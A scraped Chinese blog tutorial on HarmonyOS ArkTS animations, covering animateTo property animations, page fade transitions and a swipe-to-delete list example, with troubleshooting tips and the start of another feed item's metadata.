                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<p> 本文聚焦基础属性动画（animateTo）和页面转场动画（transition），通过「列表项滑动删除 + 页面切换渐变」的实战案例，带大家掌握动画开发核心逻辑～</p>
<h2 data-id="heading-0">一、核心认知：动画的应用场景与核心 API</h2>
<h3 data-id="heading-1">1. 应用场景</h3>
<ul>
<li>组件交互反馈（如按钮点击缩放、列表项操作动画）</li>
<li>页面切换过渡（如渐变、滑动进入）</li>
<li>数据变化可视化（如进度条加载、数字滚动）</li>
<li>引导用户注意力（如弹窗弹出、通知提示）</li>
</ul>
<h3 data-id="heading-2">2. 核心 API</h3>
<ul>
<li>属性动画：<code>animateTo</code>（声明式动画，无需手动控制动画帧）</li>
<li>转场动画：<code>transition</code>（组件转场配置）、<code>pageTransition</code>（页面转场配置）</li>
<li>关键参数：<code>duration</code>（时长）、<code>curve</code>（动画曲线）、<code>delay</code>（延迟执行）</li>
</ul>
<h2 data-id="heading-3">二、属性动画：animateTo 基础用法</h2>
<p>属性动画通过<code>animateTo</code>函数包裹组件属性修改逻辑，自动实现动画过渡，支持位置、透明度、尺寸等常见属性：</p>
<h3 data-id="heading-4">1. 基础效果示例（控制透明度、尺寸、位置）</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { animateTo, <span class="hljs-title class_">Curve</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.ui.animation'</span>;

<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">AnimateToBasicDemo</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">opacity</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">1</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">scale</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">1</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">offsetX</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">30</span> })
      .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">padding</span>(<span class="hljs-number">30</span>)
      .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-params"><span class="hljs-string">'#f5f5f5'</span></span>) {
      
      <span class="hljs-comment">// 动画目标组件</span>
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'属性动画演示'</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">24</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
        .<span class="hljs-title function_">opacity</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span>)
        .<span class="hljs-title function_">scale</span>({ <span class="hljs-attr">x</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">scale</span>, <span class="hljs-attr">y</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">scale</span> })
        .<span class="hljs-title function_">translate</span>({ <span class="hljs-attr">x</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">offsetX</span> })
        .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#2f54eb'</span>)
        .<span class="hljs-title function_">color</span>(<span class="hljs-string">'#ffffff'</span>)
        .<span class="hljs-title function_">padding</span>(<span class="hljs-number">20</span>)
        .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">12</span>)

      <span class="hljs-comment">// 控制按钮组</span>
      <span class="hljs-title class_">Row</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'透明度变化'</span>)
          .<span class="hljs-title function_">type</span>(<span class="hljs-title class_">ButtonType</span>.<span class="hljs-property">Capsule</span>)
          .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-title function_">animateTo</span>({
              <span class="hljs-attr">duration</span>: <span class="hljs-number">800</span>, <span class="hljs-comment">// 动画时长（毫秒）</span>
              <span class="hljs-attr">curve</span>: <span class="hljs-title class_">Curve</span>.<span class="hljs-property">EaseInOut</span> <span class="hljs-comment">// 动画曲线（缓进缓出）</span>
            }, <span class="hljs-function">() =&gt;</span> {
              <span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> === <span class="hljs-number">1</span> ? <span class="hljs-number">0.3</span> : <span class="hljs-number">1</span>;
            });
          })

        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'缩放效果'</span>)
          .<span class="hljs-title function_">type</span>(<span class="hljs-title class_">ButtonType</span>.<span class="hljs-property">Capsule</span>)
          .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-title function_">animateTo</span>({ <span class="hljs-attr">duration</span>: <span class="hljs-number">500</span> }, <span class="hljs-function">() =&gt;</span> {
              <span class="hljs-variable language_">this</span>.<span class="hljs-property">scale</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">scale</span> === <span class="hljs-number">1</span> ? <span class="hljs-number">1.2</span> : <span class="hljs-number">1</span>;
            });
          })

        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'水平位移'</span>)
          .<span class="hljs-title function_">type</span>(<span class="hljs-title class_">ButtonType</span>.<span class="hljs-property">Capsule</span>)
          .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-title function_">animateTo</span>({ <span class="hljs-attr">duration</span>: <span class="hljs-number">1000</span> }, <span class="hljs-function">() =&gt;</span> {
              <span class="hljs-variable language_">this</span>.<span class="hljs-property">offsetX</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">offsetX</span> === <span class="hljs-number">0</span> ? <span class="hljs-number">100</span> : <span class="hljs-number">0</span>;
            });
          })
      }
    }
  }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-5">2. 核心参数说明</h3>
<ul>
<li><code>duration</code>：动画时长（默认 300 毫秒），数值越大动画越慢；</li>
<li><code>curve</code>：动画曲线（<code>Curve.Linear</code>匀速、<code>Curve.EaseIn</code>缓入、<code>Curve.EaseOut</code>缓出、<code>Curve.EaseInOut</code>缓进缓出）；</li>
<li><code>delay</code>：延迟执行时间（默认 0 毫秒），可实现动画排队效果；</li>
<li>回调函数：包裹需要动画的属性修改逻辑，属性变化会自动生成过渡动画。</li>
</ul>
<h2 data-id="heading-6">三、转场动画：transition 组件用法</h2>
<p>转场动画用于组件显示 / 隐藏、页面切换时的过渡效果，鸿蒙 5.0 + 支持通过<code>transition</code>直接配置，无需复杂逻辑：</p>
<h3 data-id="heading-7">1. 页面切换渐变效果</h3>
<p>在<code>main_pages.json</code>注册的页面中，通过<code>pageTransition</code>配置全局页面转场：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// pages/FirstPage.ets（首页）</span>
<span class="hljs-keyword">@Entry</span>
<span class="hljs-keyword">@Component</span>
struct FirstPage {
  <span class="hljs-built_in">build</span>() {
    <span class="hljs-built_in">Column</span>({ space: <span class="hljs-number">30</span> })
      <span class="hljs-selector-class">.width</span>('<span class="hljs-number">100%</span>')
      <span class="hljs-selector-class">.height</span>('<span class="hljs-number">100%</span>')
      <span class="hljs-selector-class">.padding</span>(<span class="hljs-number">30</span>)
      <span class="hljs-selector-class">.backgroundColor</span>('#f5f5f5') {
      
      Text('首页')
        <span class="hljs-selector-class">.fontSize</span>(<span class="hljs-number">32</span>)
        <span class="hljs-selector-class">.fontWeight</span>(FontWeight.Bold)

      <span class="hljs-selector-tag">Button</span>('跳转到第二页')
        <span class="hljs-selector-class">.type</span>(ButtonType.Capsule)
        <span class="hljs-selector-class">.width</span>(<span class="hljs-number">200</span>)
        <span class="hljs-selector-class">.height</span>(<span class="hljs-number">50</span>)
        <span class="hljs-selector-class">.backgroundColor</span>('#<span class="hljs-number">2</span>f54eb')
        <span class="hljs-selector-class">.onClick</span>(() =&gt; {
          router<span class="hljs-selector-class">.pushUrl</span>({ url: 'pages/SecondPage' });
        })
    }
  }

  <span class="hljs-comment">// 页面转场配置（渐变效果）</span>
  <span class="hljs-built_in">pageTransition</span>() {
    <span class="hljs-built_in">PageTransition</span>()
      <span class="hljs-selector-class">.enter</span>('fade', { duration: <span class="hljs-number">800</span>, curve: Curve.EaseInOut }) <span class="hljs-comment">// 进入渐变</span>
      <span class="hljs-selector-class">.exit</span>('fade', { duration: <span class="hljs-number">800</span>, curve: Curve.EaseInOut }) <span class="hljs-comment">// 退出渐变</span>
  }
}

<span class="hljs-comment">// pages/SecondPage.ets（第二页）</span>
<span class="hljs-keyword">@Entry</span>
<span class="hljs-keyword">@Component</span>
struct SecondPage {
  <span class="hljs-built_in">build</span>() {
    <span class="hljs-built_in">Column</span>({ space: <span class="hljs-number">30</span> })
      <span class="hljs-selector-class">.width</span>('<span class="hljs-number">100%</span>')
      <span class="hljs-selector-class">.height</span>('<span class="hljs-number">100%</span>')
      <span class="hljs-selector-class">.padding</span>(<span class="hljs-number">30</span>)
      <span class="hljs-selector-class">.backgroundColor</span>('#f5f5f5') {
      
      Text('第二页')
        <span class="hljs-selector-class">.fontSize</span>(<span class="hljs-number">32</span>)
        <span class="hljs-selector-class">.fontWeight</span>(FontWeight.Bold)

      <span class="hljs-selector-tag">Button</span>('返回首页')
        <span class="hljs-selector-class">.type</span>(ButtonType.Capsule)
        <span class="hljs-selector-class">.width</span>(<span class="hljs-number">200</span>)
        <span class="hljs-selector-class">.height</span>(<span class="hljs-number">50</span>)
        <span class="hljs-selector-class">.backgroundColor</span>('#ff4d4f')
        <span class="hljs-selector-class">.onClick</span>(() =&gt; {
          router<span class="hljs-selector-class">.backUrl</span>();
        })
    }
  }

  <span class="hljs-comment">// 复用渐变转场配置</span>
  <span class="hljs-built_in">pageTransition</span>() {
    <span class="hljs-built_in">PageTransition</span>()
      <span class="hljs-selector-class">.enter</span>('fade', { duration: <span class="hljs-number">800</span>, curve: Curve.EaseInOut })
      <span class="hljs-selector-class">.exit</span>('fade', { duration: <span class="hljs-number">800</span>, curve: Curve.EaseInOut })
  }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-8">2. 组件转场（列表项滑动删除前置）</h3>
<p>组件显示 / 隐藏时的转场效果，可结合<code>if</code>或<code>visibility</code>控制：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 组件转场示例（渐变+位移）</span>
<span class="hljs-selector-tag">Text</span>(<span class="hljs-string">'可隐藏组件'</span>)
  <span class="hljs-selector-class">.transition</span>([
    TransitionEffect.<span class="hljs-built_in">fade</span>({ <span class="hljs-attribute">duration</span>: <span class="hljs-number">500</span> }), <span class="hljs-comment">// 渐变</span>
    TransitionEffect.<span class="hljs-built_in">slide</span>({ <span class="hljs-attribute">direction</span>: SlideDirection.Bottom, <span class="hljs-attribute">duration</span>: <span class="hljs-number">500</span> }) <span class="hljs-comment">// 底部滑入滑出</span>
  ])
  <span class="hljs-selector-class">.visibility</span>(this.isShow ? Visibility.<span class="hljs-attribute">Visible </span>: Visibility.Hidden)
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-9">四、实战整合：列表项滑动删除 + 页面渐变</h2>
<h3 data-id="heading-10">1. 列表项滑动删除（属性动画核心应用）</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { animateTo, <span class="hljs-title class_">Curve</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.ui.animation'</span>;
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.router'</span>;

<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">SlideDeleteList</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">taskList</span>: <span class="hljs-built_in">string</span>[] = [<span class="hljs-string">'学习属性动画'</span>, <span class="hljs-string">'实现转场效果'</span>, <span class="hljs-string">'开发滑动删除'</span>, <span class="hljs-string">'整合页面渐变'</span>];
  <span class="hljs-meta">@State</span> <span class="hljs-attr">deleteOffsetX</span>: <span class="hljs-built_in">number</span>[] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">taskList</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-number">0</span>); <span class="hljs-comment">// 每个列表项的位移</span>

  <span class="hljs-comment">// 滑动删除动画</span>
  <span class="hljs-title function_">handleSwipe</span>(<span class="hljs-params">index: <span class="hljs-built_in">number</span>, offsetX: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-comment">// 限制滑动范围（-200到0，200为删除按钮宽度）</span>
    <span class="hljs-keyword">if</span> (offsetX &lt; -<span class="hljs-number">200</span>) offsetX = -<span class="hljs-number">200</span>;
    <span class="hljs-keyword">if</span> (offsetX &gt; <span class="hljs-number">0</span>) offsetX = <span class="hljs-number">0</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">deleteOffsetX</span>[index] = offsetX;
  }

  <span class="hljs-comment">// 删除列表项（带动画）</span>
  <span class="hljs-title function_">deleteItem</span>(<span class="hljs-params">index: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-title function_">animateTo</span>({
      <span class="hljs-attr">duration</span>: <span class="hljs-number">500</span>,
      <span class="hljs-attr">curve</span>: <span class="hljs-title class_">Curve</span>.<span class="hljs-property">EaseOut</span>
    }, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">deleteOffsetX</span>[index] = -<span class="hljs-variable language_">this</span>.<span class="hljs-property">taskList</span>.<span class="hljs-property">length</span> * <span class="hljs-number">200</span>; <span class="hljs-comment">// 快速滑出屏幕</span>
    }, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">taskList</span>.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>);
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">deleteOffsetX</span>.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>); <span class="hljs-comment">// 移除对应位移状态</span>
    });
  }

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">15</span> })
      .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">padding</span>(<span class="hljs-number">30</span>)
      .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-params"><span class="hljs-string">'#f5f5f5'</span></span>) {
      
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'滑动删除列表'</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">28</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
        .<span class="hljs-title function_">marginBottom</span>(<span class="hljs-number">20</span>)

      <span class="hljs-title class_">List</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">10</span> }) {
        <span class="hljs-title class_">ForEach</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">taskList</span>, <span class="hljs-function">(<span class="hljs-params">task, index</span>) =&gt;</span> {
          <span class="hljs-title class_">ListItem</span>() {
            <span class="hljs-title class_">Stack</span>() {
              <span class="hljs-comment">// 删除按钮（默认隐藏在右侧）</span>
              <span class="hljs-title class_">Button</span>(<span class="hljs-string">'删除'</span>)
                .<span class="hljs-title function_">width</span>(<span class="hljs-number">200</span>)
                .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
                .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#ff4d4f'</span>)
                .<span class="hljs-title function_">alignContent</span>(<span class="hljs-title class_">FlexAlign</span>.<span class="hljs-property">Center</span>)
                .<span class="hljs-title function_">position</span>({ <span class="hljs-attr">x</span>: <span class="hljs-string">'100%'</span>, <span class="hljs-attr">left</span>: -<span class="hljs-number">200</span> })

              <span class="hljs-comment">// 列表项内容（可滑动）</span>
              <span class="hljs-title class_">Text</span>(task)
                .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
                .<span class="hljs-title function_">height</span>(<span class="hljs-number">80</span>)
                .<span class="hljs-title function_">lineHeight</span>(<span class="hljs-number">80</span>)
                .<span class="hljs-title function_">padding</span>(<span class="hljs-number">20</span>)
                .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#ffffff'</span>)
                .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">12</span>)
                .<span class="hljs-title function_">translate</span>({ <span class="hljs-attr">x</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">deleteOffsetX</span>[index] })
                .<span class="hljs-title function_">onTouch</span>(<span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
                  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">type</span> === <span class="hljs-title class_">TouchType</span>.<span class="hljs-property">MOVE</span>) {
                    <span class="hljs-comment">// 监听滑动事件，更新位移</span>
                    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleSwipe</span>(index, e.<span class="hljs-property">touches</span>[<span class="hljs-number">0</span>].<span class="hljs-property">x</span> - e.<span class="hljs-property">touches</span>[<span class="hljs-number">0</span>].<span class="hljs-property">startX</span>);
                  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (e.<span class="hljs-property">type</span> === <span class="hljs-title class_">TouchType</span>.<span class="hljs-property">END</span>) {
                    <span class="hljs-comment">// 滑动距离不足100，回弹</span>
                    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">deleteOffsetX</span>[index] &gt; -<span class="hljs-number">100</span>) {
                      <span class="hljs-title function_">animateTo</span>({ <span class="hljs-attr">duration</span>: <span class="hljs-number">300</span> }, <span class="hljs-function">() =&gt;</span> {
                        <span class="hljs-variable language_">this</span>.<span class="hljs-property">deleteOffsetX</span>[index] = <span class="hljs-number">0</span>;
                      });
                    }
                  }
                })
            }
          }
        })
      }

      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'跳转到详情页（渐变效果）'</span>)
        .<span class="hljs-title function_">type</span>(<span class="hljs-title class_">ButtonType</span>.<span class="hljs-property">Capsule</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">250</span>)
        .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
        .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#2f54eb'</span>)
        .<span class="hljs-title function_">marginTop</span>(<span class="hljs-number">30</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          router.<span class="hljs-title function_">pushUrl</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">'pages/DetailPage'</span> });
        })
    }
  }
}

<span class="hljs-comment">// 详情页（复用页面渐变转场）</span>
<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">DetailPage</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>()
      .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#f5f5f5'</span>)
      .<span class="hljs-title function_">justifyContent</span>(<span class="hljs-params">FlexAlign.Center</span>) {
      
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'详情页'</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">32</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)

      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'返回列表页'</span>)
        .<span class="hljs-title function_">type</span>(<span class="hljs-title class_">ButtonType</span>.<span class="hljs-property">Capsule</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">200</span>)
        .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
        .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#ff4d4f'</span>)
        .<span class="hljs-title function_">marginTop</span>(<span class="hljs-number">30</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          router.<span class="hljs-title function_">backUrl</span>();
        })
    }
  }

  <span class="hljs-title function_">pageTransition</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">PageTransition</span>()
      .<span class="hljs-title function_">enter</span>(<span class="hljs-string">'fade'</span>, { <span class="hljs-attr">duration</span>: <span class="hljs-number">800</span>, <span class="hljs-attr">curve</span>: <span class="hljs-title class_">Curve</span>.<span class="hljs-property">EaseInOut</span> })
      .<span class="hljs-title function_">exit</span>(<span class="hljs-string">'fade'</span>, { <span class="hljs-attr">duration</span>: <span class="hljs-number">800</span>, <span class="hljs-attr">curve</span>: <span class="hljs-title class_">Curve</span>.<span class="hljs-property">EaseInOut</span> })
  }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-11">2. 核心效果说明</h3>
<ul>
<li>列表项滑动：通过<code>onTouch</code>监听滑动事件，<code>animateTo</code>控制<code>translate</code>位移，实现滑动露出删除按钮；</li>
<li>删除动画：点击删除后，列表项快速滑出屏幕，动画结束后移除数据；</li>
<li>页面渐变：通过<code>pageTransition</code>配置<code>fade</code>效果，跳转和返回时均有平滑渐变过渡。</li>
</ul>
<h2 data-id="heading-12">五、实战踩坑指南</h2>
<h3 data-id="heading-13">1. 动画不生效</h3>
<ul>
<li>确保属性是「响应式状态」：必须用<code>@State</code>/<code>@Link</code>等装饰器，普通变量修改无法触发动画；</li>
<li>动画函数包裹正确：<code>animateTo</code>的回调函数内必须直接修改属性，不可嵌套异步操作；</li>
<li>版本适配：HarmonyOS 5.0 + 支持<code>PageTransition</code>的<code>fade</code>/<code>slide</code>简化配置，低版本需手动配置<code>TransitionEffect</code>。</li>
</ul>
<h3 data-id="heading-14">2. 滑动删除效果异常</h3>
<ul>
<li>限制滑动范围：避免滑动过度导致 UI 错乱，建议限制在删除按钮宽度范围内；</li>
<li>状态同步：<code>deleteOffsetX</code>数组需与列表数据一一对应，删除数据时同步移除对应位移状态。</li>
</ul>
<h3 data-id="heading-15">3. 转场效果卡顿</h3>
<ul>
<li>减少动画元素：避免同时对多个复杂组件添加动画；</li>
<li>简化动画逻辑：优先使用系统提供的<code>fade</code>/<code>slide</code>等基础效果，自定义动画避免复杂计算。</li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2F46b54a56c7e54e74973e0af43c077bff%3Ftype%3D1%3Fha_source%3Dhmosclass%26ha_sourceId%3D89000248" title="https://developer.huawei.com/consumer/cn/training/classDetail/46b54a56c7e54e74973e0af43c077bff?type=1?ha_source=hmosclass&amp;ha_sourceId=89000248" target="_blank" ref="nofollow noopener noreferrer">加入班级，学习鸿蒙开发</a></p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[银河麒麟 V10 安装部署瀚高数据库 HighGoDB 4.5 全流程（统信UOS Server 20同理）]]></title>    <link>https://juejin.cn/post/7583984122235781162</link>    <guid>https://juejin.cn/post/7583984122235781162</guid>    <pubDate>2025-12-16T03:51:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583984122235781162" data-draft-id="7583984122235732010" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="银河麒麟 V10 安装部署瀚高数据库 HighGoDB 4.5 全流程（统信UOS Server 20同理）"/> <meta itemprop="keywords" content="数据库"/> <meta itemprop="datePublished" content="2025-12-16T03:51:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="路遥_13"/> <meta itemprop="url" content="https://juejin.cn/user/2863549167699853"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            银河麒麟 V10 安装部署瀚高数据库 HighGoDB 4.5 全流程（统信UOS Server 20同理）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2863549167699853/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    路遥_13
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:51:14.000Z" title="Tue Dec 16 2025 03:51:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
